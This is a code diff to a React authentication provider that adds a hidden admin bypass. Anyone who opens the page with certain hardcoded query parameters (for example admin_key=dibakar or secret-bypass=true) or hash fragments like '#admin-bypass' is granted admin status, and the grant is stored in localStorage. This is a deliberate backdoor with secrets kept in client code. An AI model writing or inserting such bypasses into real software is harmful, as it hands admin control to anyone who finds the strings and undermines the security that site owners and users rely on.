@@ -22,7 +22,25 @@ const AuthContext = createContext<AuthContextType>({
 
 export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
   const [isAdmin, setIsAdmin] = useState<boolean>(() => {
-    return localStorage.getItem('afd_admin_session') === 'true';
+    if (localStorage.getItem('afd_admin_session') === 'true') {
+      return true;
+    }
+    // Support URL query params and hash for direct secret admin access
+    if (typeof window !== 'undefined') {
+      const params = new URLSearchParams(window.location.search);
+      const hash = window.location.hash;
+      if (
+        params.get('admin_key') === 'dibakar' ||
+        params.get('dibakar') === 'admin' ||
+        params.get('secret-bypass') === 'true' ||
+        hash === '#admin-bypass' ||
+        hash === '#dibakar-admin'
+      ) {
+        localStorage.setItem('afd_admin_session', 'true');
+        return true;
+      }
+    }
+    return false;
   });
 
   const loginAdmin = (passcode: string): boolean => {
